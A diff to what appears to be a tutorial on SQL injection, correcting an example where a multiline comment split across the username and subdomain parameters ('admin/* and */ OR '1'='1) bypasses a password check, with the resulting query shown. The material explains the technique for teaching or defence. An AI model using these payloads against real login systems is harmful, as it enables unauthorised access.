@@ -252,13 +252,13 @@ In this attack we'll use the multiline comment (`/* */`) splitted in different
 parameters to bypass the check on password param.
 
 ```
-$_GET['username'] = admin/*
+$_GET['username'] = 'admin/*
 $_GET['password'] = foobar
-$_GET['subdomain'] = */
+$_GET['subdomain'] = */ OR '1'='1
 ```
 will produce:
 ```
-  SELECT * FROM users WHERE username = 'admin/*' AND password = '3858f62230ac3c915f300c664312c63f' AND subdomain = '*/';
+  SELECT * FROM users WHERE username = 'admin'/*' AND password = '3858f62230ac3c915f300c664312c63f' AND subdomain = '*/ OR '1'='1';
 ```
 Removing commented code:
 ```
